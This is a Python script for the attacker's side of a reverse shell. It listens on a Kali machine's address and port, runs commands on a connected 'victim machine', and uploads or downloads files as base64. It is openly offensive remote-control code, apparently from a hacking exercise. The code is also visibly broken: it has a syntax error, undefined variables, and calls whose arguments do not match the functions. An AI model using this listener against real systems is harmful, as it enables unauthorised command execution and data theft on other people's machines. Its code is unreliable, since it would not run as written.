#!/usr/bin/python

import socket, json, base64

class Listener:
    def __init__(self):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Create a socket object
        listener = setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port)) #Your Kali Machine IP Address and any port for listening
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept() #It returns two value connection and address
        print("[+] Got a connection")
     
    def JSONSend(self, data): # use this function to reliable send
        jsonData = json.dumps(data)
        self.connection.send(jsonData)
        
    def JSONReceive(self): #Use this function to reliable receive
        while True:
            try:
                jsonData = jsonData + self.connection.recv(1024)
                return json.loads(jsonData)
            except ValueError:
                continue
     
    def executeRemotely(self, command): #Function to execute commands
        self.JSONSend(command)
        if command[0] == "exit": #For exiting
            self.connection.close()
            exit()
        result self.JSONReceive()
    
    def readFile(self, path): #Download File
        with open(path, "rb") as file: #read Binary of file
            return base64.b64encode(file.read())
    
    def writeFile(self, path, content): #Write FIle
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"
    
    def run(self):
        while True: #Loop for to executes commands on the Victem Machine
            command = raw_input(">> ")
            command = command.split(" ")
            
            try: #Try catch block to catch exception
                if command[0] == "upload":
                    fileContent = self.readFile(command[1])
                    command.append(fileContent)
                result = self.executeRemotely(command)
                if command[0] == "download":
                    result = self.writeFile(result)
            except Exception:
                result = "[-] Error during command execution."
 
            print result

myListener = Listener("10.0.2.16", 4444) # Kali Machine IP and port
myListener.run()